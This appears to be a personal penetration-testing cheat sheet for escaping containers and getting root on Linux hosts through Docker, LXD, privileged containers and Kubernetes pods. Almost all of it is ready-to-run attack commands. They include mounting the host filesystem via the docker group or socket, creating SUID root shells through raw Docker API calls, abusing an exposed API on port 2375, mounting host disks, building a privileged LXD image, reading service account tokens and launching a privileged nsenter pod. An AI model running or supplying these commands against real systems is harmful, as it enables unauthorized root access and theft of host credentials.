# Linux privesc: docker and lxd

## Where I am
id
ls -la /var/run/docker.sock
ls -la /.dockerenv
cat /proc/1/cgroup
hostname
- [ ] docker or lxd in id: root on this host
- [ ] docker.sock writable by me: the same as the docker group
- [ ] /.dockerenv, docker or kubepods in the cgroup, or a hostname of random hex: I am inside a container

## Docker group or a writable socket
docker images
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
With no network to pull alpine, THE-IMAGE is one docker images lists:
docker run -v /:/mnt --rm -it THE-IMAGE chroot /mnt sh
With no terminal, as in a plain reverse shell, a SUID copy instead:
docker run -v /:/mnt --rm THE-IMAGE chroot /mnt sh -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'
/tmp/rootbash -p

## The socket with no docker client
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
A container that mounts the host, from an image that list gives:
curl -s --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' -d '{"Image":"THE-IMAGE","Cmd":["chroot","/mnt","sh","-c","cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"],"HostConfig":{"Binds":["/:/mnt"]}}' http://localhost/containers/create
THE-ID is the Id it answers with:
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/THE-ID/start
/tmp/rootbash -p

## The Docker API open on the network
curl -s http://<TargetIP>:2375/version
docker -H tcp://<TargetIP>:2375 images
docker -H tcp://<TargetIP>:2375 run -v /:/mnt --rm -it THE-IMAGE chroot /mnt sh
- [ ] 2376 is the TLS port, and wants a client certificate

## Inside a container: cdk, from pwn-shop
At the pwn-broker prompt:
tool install cdk
serve
serve files cdk
On the target, in /dev/shm, the line serve files gives, then:
chmod +x cdk
./cdk evaluate --full
./cdk run --list
- [ ] cdk_thin is smaller, and leaves out the Kubernetes exploits

## A privileged container
fdisk -l
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host bash
- [ ] fdisk -l shows the host's disks only in a privileged container
- [ ] The disk may be /dev/vda1 or /dev/nvme0n1p1 in place of /dev/sda1

## Mounts from the host
mount | grep -vE 'proc|sys|cgroup|overlay'
- [ ] docker.sock mounted inside: a new container that mounts the host, as above
- [ ] The host's /etc, /root or a home folder mounted: keys and passwords, :Pb linux-creds

## The lxd group
On Kali, a small Alpine image:
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo ./build-alpine
- [ ] The .tar.gz it builds goes in the target's upload/ folder, and serve files alpine gives the line to fetch it
On the target, in /dev/shm, after that line:
lxc image import ./alpine-*.tar.gz --alias pe-img
lxc init pe-img pe -c security.privileged=true
lxc config device add pe host-root disk source=/ path=/mnt/root recursive=true
lxc start pe
lxc exec pe /bin/sh
Inside, the host's disk is under /mnt/root:
chroot /mnt/root /bin/bash
- [ ] No storage pool found: lxd init with every default, then lxc init again

## A Kubernetes pod
cat /var/run/secrets/kubernetes.io/serviceaccount/token
kubectl auth can-i --list
When I may create pods, one that enters the host:
kubectl run pe --restart=Never -ti --rm --image alpine --overrides '{"spec":{"hostPID":true,"containers":[{"name":"pe","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin":true,"tty":true,"securityContext":{"privileged":true}}]}}'
- [ ] A container shares the host's kernel: a kernel exploit here hits the host, :Pb linux-kernel
